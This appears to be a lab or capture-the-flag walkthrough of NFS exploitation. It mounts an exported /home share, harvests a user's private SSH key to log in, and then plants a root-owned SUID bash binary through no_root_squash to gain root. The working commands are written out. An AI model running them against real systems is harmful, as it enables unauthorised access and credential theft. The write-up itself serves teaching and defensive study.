text: NFS (Network File System) Exploitation & Privilege Escalation

NFS is a protocol used to share files over a network. Misconfigurations like <highlight>no_root_squash</highlight> allow low-privileged users to gain <highlight>root</highlight> access by manipulating file ownership.
Nmap confirms port 2049 is open. The showmount command reveals the /home directory is exported to everyone (*).
The remote /home directory is mounted locally to /tmp/nfs_mount using the -nolock flag to bypass locking issues.
Phase 3: Gaining Initial Access (SSH Key Harvesting)

code:
ls -la /tmp/nfs_mount/cappucino/.ssh
cp /tmp/nfs_mount/cappucino/.ssh/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa cappucino@<TARGET_IP>

text: A private SSH key was found in the mounted share, providing a low-privileged shell as user cappucino.
The 'no_root_squash' option tells the server to trust the client's root user, allowing the creation of root-owned SUID binaries.

code:
sudo cp /bin/bash /tmp/nfs_mount/bash
sudo chown root:root /tmp/nfs_mount/bash
sudo chmod +s /tmp/nfs_mount/bash

text: A bash binary was copied to the mount, assigned root ownership, and given the SUID bit (+s) on the attacker machine.
The SUID bash binary executes with root privileges on the target server, granting full administrative access.

title: Steps Performed
items: Scanned port 2049 to identify the NFS service
Listed exports using showmount to find accessible directories
Mounted the /home share to the local attacker machine
Harvested id_rsa keys to gain initial SSH access
Verified 'no_root_squash' by checking file ownership capabilities
Uploaded a bash binary and set the SUID bit as root
Executed the binary on the target with the -p flag
Obtained a root shell and captured the final flag
